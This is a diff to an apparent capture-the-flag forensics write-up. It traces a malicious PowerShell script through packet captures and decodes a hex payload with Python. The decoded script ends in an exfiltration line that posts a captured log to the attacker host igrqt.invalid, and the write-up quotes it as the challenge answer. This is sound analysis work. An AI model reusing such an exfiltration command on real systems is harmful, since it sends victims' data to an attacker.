@@ -197,13 +197,14 @@ This PowerShell script seems to be the malicious file mentioned in the challenge
 faux.christopher@oops.net
 ```
 To complete part 2, we need to find the server to whom this malicious file sends a POST request. The PowerShell script seems to make a GET request from 'http://worsc.invalid/activity'. This conveniently happens to be the same domain from which the malicious IP from Task 1 sends data via HTTP. 
-> insert image
+![image](https://media.github.tamu.edu/user/17583/files/620a1c00-c83e-11ec-8271-6520accf8e4b)
+
 
 We need to find out what they sent. By right-clicking on the packet and picking "Follow > TCP Stream" we can get the full message as a hex array.
 
-> tcp stream
+![image](https://media.github.tamu.edu/user/17583/files/81a14480-c83e-11ec-8750-aaac8e4c694e)
 
-I copied this entire block of data (sans header) directly into my next Python script, which I wrote as an approximate "translation" of the PowerShell script:
+I copied this entire block of data (sans header) directly into my next Python script, in order to write an approximate "translation" of the PowerShell script:
 
 ```
 #!/bin/python3
@@ -225,11 +226,11 @@ I then executed my script in the command line...
 ```
 $ python3 hex_reader.txt > outputscript.txt
 ```
-...which returned a long PowerShell script. In the last line was this:
+...which returns a long PowerShell script. In the last line was this:
 ```
 Invoke-WebRequest -uri http://igrqt.invalid:8080 -Method Post -Body $global:log
 ```
-All we need is the url to successfully complete the challenge.
+All we need is the url on this line to successfully complete the challenge.
 
 
 
